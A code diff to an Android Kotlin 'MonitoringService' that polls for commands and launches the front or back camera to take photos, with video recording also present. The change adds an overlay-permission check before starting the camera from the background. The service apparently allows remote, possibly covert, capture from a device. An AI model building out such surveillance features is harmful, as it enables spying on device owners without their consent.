@@ -5,6 +5,7 @@ import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.content.Intent
 import android.os.Build
+import android.provider.Settings
 import androidx.core.app.NotificationCompat
 import androidx.lifecycle.LifecycleService
 import androidx.lifecycle.lifecycleScope
@@ -41,14 +42,14 @@ class MonitoringService : LifecycleService() {
     private var isRunning = true
 
     override fun onCreate() {
-    super.onCreate()
-    try {
-        createChannel()
-        startForeground(1, buildNotification())
-        startPolling()
-    } catch (e: Exception) {
-        e.printStackTrace()
-    }
+        super.onCreate()
+        try {
+            createChannel()
+            startForeground(1, buildNotification())
+            startPolling()
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -126,15 +127,19 @@ class MonitoringService : LifecycleService() {
     }
 
     private fun takePhoto(back: Boolean) {
-    sendMessage("📷 Taking ${if (back) "back" else "front"} photo...")
-    try {
-        val intent = Intent(this, CameraActivity::class.java)
-        intent.putExtra(CameraActivity.EXTRA_BACK, back)
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-        startActivity(intent)
-    } catch (e: Exception) {
-        sendMessage("❌ Photo failed: ${e.message}")
-       }
+        sendMessage("📷 Taking ${if (back) "back" else "front"} photo...")
+        try {
+            val canOverlay = if (Build.VERSION.SDK_INT >= 23)
+                Settings.canDrawOverlays(this) else true
+            sendMessage("Debug: overlay=$canOverlay")
+
+            val intent = Intent(this, CameraActivity::class.java)
+            intent.putExtra(CameraActivity.EXTRA_BACK, back)
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            startActivity(intent)
+        } catch (e: Exception) {
+            sendMessage("❌ Photo failed: ${e.message}")
+        }
     }
 
     private fun recordVideo(back: Boolean, duration: Int) {
